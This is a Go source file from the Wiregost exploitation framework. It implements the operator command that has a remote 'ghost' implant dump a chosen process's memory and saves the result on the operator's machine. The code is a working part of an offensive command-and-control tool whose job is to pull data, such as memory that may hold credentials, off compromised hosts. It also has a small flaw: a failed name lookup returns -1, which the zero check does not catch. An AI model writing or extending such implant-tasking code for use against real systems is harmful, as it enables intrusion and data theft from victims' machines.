// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package proc

import (
	"fmt"
	"io/ioutil"
	"path"

	"github.com/gogo/protobuf/proto"

	. "github.com/maxlandon/wiregost/client/commands"
	"github.com/maxlandon/wiregost/client/constants"
	"github.com/maxlandon/wiregost/client/spin"
	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
)

// ProcOptions - Filters available to proc commands
type ProcDumpOptions struct {
	Exe     string `long:"exe" description:"Process name"`
	Timeout int    `long:"timeout" description:"Command timeout"`
}

type ProcDumpCmd struct {
	Positional struct {
		PID int `long:"pid" description:"Process ID" required:"1"`
	} `positional-args:"yes" required:"yes"`
	Options *ProcDumpOptions `group:"Process filters"`
}

var ProcDump ProcDumpCmd

func RegisterProcDump() {
	GhostParser.AddCommand(constants.ProcDump, "", "", &ProcDump)

	pd := GhostParser.Find(constants.ProcDump)
	pd.ShortDescription = "Dump the memory of a process identified by its PID"
	pd.Args()[0].RequiredMaximum = 1
}

func (pd *ProcDumpCmd) Execute(args []string) error {

	var pid = pd.Positional.PID

	var name = pd.Options.Exe

	var timeout = pd.Options.Timeout
	if timeout == 0 {
		timeout = 360
	}

	// if pid == -1 && name != "" {
	if pid == 0 && name != "" {
		pid = getPIDByName(name, Context, Context.Server.RPC)
	}
	if pid == 0 {
		fmt.Printf(Warn + "Invalid process target\n")
		return nil
	}

	if timeout < 1 {
		fmt.Printf(Warn + "Invalid timeout argument\n")
		return nil
	}

	ctrl := make(chan bool)
	go spin.Until("Dumping remote process memory ...", ctrl)
	data, _ := proto.Marshal(&ghostpb.ProcessDumpReq{
		GhostID: Context.Ghost.ID,
		Pid:     int32(pid),
		Timeout: int32(timeout),
	})
	resp := <-Context.Server.RPC(&ghostpb.Envelope{
		Type: ghostpb.MsgProcessDumpReq,
		Data: data,
	}, DefaultTimeout)
	ctrl <- true
	<-ctrl

	procDump := &ghostpb.ProcessDump{}
	proto.Unmarshal(resp.Data, procDump)
	if procDump.Err != "" {
		fmt.Printf(RPCError+"%s\n", resp.Err)
		return nil
	}

	hostname := Context.Ghost.Hostname
	temp := path.Base(fmt.Sprintf("procdump_%s_%d_*", hostname, pid))
	f, err := ioutil.TempFile("", temp)
	if err != nil {
		fmt.Printf(Warn+"Error creating temporary file: %v\n", err)
	}
	f.Write(procDump.GetData())
	fmt.Printf(Success+"Process dump stored in %s\n", f.Name())

	return nil
}

func getPIDByName(name string, Context ShellContext, rpc RPCServer) int {
	data, _ := proto.Marshal(&ghostpb.PsReq{GhostID: Context.Ghost.ID})
	resp := <-rpc(&ghostpb.Envelope{
		Type: ghostpb.MsgPsReq,
		Data: data,
	}, DefaultTimeout)
	ps := &ghostpb.Ps{}
	proto.Unmarshal(resp.Data, ps)
	for _, proc := range ps.Processes {
		if proc.Executable == name {
			return int(proc.Pid)
		}
	}
	return -1
}
